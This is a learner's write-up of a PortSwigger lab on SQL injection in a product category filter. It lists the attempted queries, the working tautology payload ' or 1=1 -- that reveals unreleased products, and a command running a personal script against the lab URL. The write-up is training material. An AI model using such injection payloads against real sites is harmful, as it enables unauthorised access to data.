## SQL injection - product category filter

The primary goal of this lab is to manipulate SQL queries to display all products, including those not meant to be released or shown to users. Typically, a product's visibility is controlled by a 'released' flag in the database, with '1' indicating that the product is released and '0' indicating it is not.


ref:

```
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
```

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

**End goal:** display all products both released and unreleased.

### Vulnerability Analysis

In this scenario, the application uses a query to filter products based on their category and whether they have been released:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The goal is to modify this query so it returns all products, regardless of their 'released' status.

### Attack Vectors

Below are a series of SQL manipulations attempted to exploit the vulnerability:

1. **Initial Attempt**:

   ```sql
   SELECT * FROM products WHERE category = 'Pets' AND released = 1
   ```

   This query changes the category but still only shows released products.
2. **Syntax Testing**:

   ```sql
   SELECT * FROM products WHERE category = ''' AND released = 1
   ```

   This introduces a syntax error to test the application's handling of SQL input.
3. **Commenting Out**:

   ```sql
   SELECT * FROM products WHERE category = ''--' AND released = 1
   ```

   Attempts to comment out the rest of the SQL query but incorrectly formatted.
4. **Empty Category**:

   ```sql
   SELECT * FROM products WHERE category = ''
   ```

   Removes the category filter but doesn't address the 'released' condition.
5. **Successful Exploit**:

   ```sql
   SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
   ```

   This is the successful payload. By injecting `' or 1=1 --`, it effectively removes the filter on the 'released' status, making the query return all products. The `1=1` is always true, and `--` comments out the rest of the query, preventing any syntax errors or further conditions from being applied.

### Test Payloads

To exploit this vulnerability, the following payloads were tested:

- `'`
- `'--`
- `' or 1=1 --`

The payload that solved the lab and achieved the objective of revealing all products was:

```sql
' or 1=1 --
```

## How It Works

The successful payload works by breaking out of the application's intended SQL query structure and injecting our own logic that always evaluates to true. By appending `--`, we ensure the original query's remaining parts are ignored by the database, effectively bypassing any filters the application intended to apply.

Open Burp Suite, cz i fixed the proxy here with burpsuite

` $ python -u "h:\bug Bountry\Web\SQL injection\Lab1\sql script.py" "https://0a20007e04b26508881fc4df00f900ae.web-security-academy.net/filter?category=" "'or 1=1--"    `

`[+] SQL injection successful! `
